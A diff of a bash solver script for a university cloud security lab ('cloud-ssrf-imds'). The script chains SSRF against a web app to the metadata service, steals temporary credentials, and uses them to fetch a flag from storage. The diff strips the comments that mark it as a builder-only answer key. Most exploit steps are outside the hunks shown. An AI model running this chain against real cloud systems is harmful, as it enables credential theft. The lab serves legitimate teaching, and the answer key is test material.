@@ -1,23 +1,10 @@
 #!/bin/bash
-#
-# solver.sh - cloud-ssrf-imds (SecLab PTIT / Do an DevSecOps 2026)
-#
-# LOI GIAI MAU - CHI dung de nguoi xay lab tu kiem tra (dat goal, chay
-# duoc het chuoi khai thac + hardening). KHONG phat cho sinh vien, KHONG
-# dat trong thu muc client/ (se bi dong goi vao artifact/home cua SV).
-#
-# Chay TU BEN TRONG container 'client' sau khi 'labtainer cloud-ssrf-imds'
-# da khoi dong xong (vd qua virtual terminal cua client, hoac
-# `docker exec -it <client_container> bash` roi paste script nay vao).
-#
-# Chuoi thuc hien: SSRF (discover) -> SSRF->IMDS (steal credential) ->
-# storage (lay flag) -> hardening (allowlist + IMDSv2) -> remediation.txt.
-#
+
 set -uo pipefail
 
-WEB="${WEB:-web}"          # 172.34.0.20
-IMDS="${IMDS:-imds}"       # 172.34.0.40 (mo phong 169.254.169.254)
-STORAGE="${STORAGE:-storage}"  # 172.34.0.30
+WEB="${WEB:-web}"
+IMDS="${IMDS:-imds}"
+STORAGE="${STORAGE:-storage}"
 ROLE="web-imgproxy-role"
 
 echo "== [1/4] discover_ssrf: xac nhan webapp bi ep goi toi dich noi bo =="
@@ -41,9 +28,6 @@ echo "AccessKeyId=$AK"
 echo "== [3/4] access_storage_get_flag: dung credential danh cap de lay flag =="
 export AWS_ACCESS_KEY_ID="$AK"
 export AWS_SECRET_ACCESS_KEY="$SK"
-# MinIO (mo phong cloud) chap nhan access/secret key nhu credential thuong va
-# KHONG co STS de validate session token -> KHONG gui token (neu gui se bi
-# InvalidTokenId). Token $TK van la bang chung da danh cap duoc credential tam.
 unset AWS_SESSION_TOKEN
 export AWS_DEFAULT_REGION=us-east-1
 
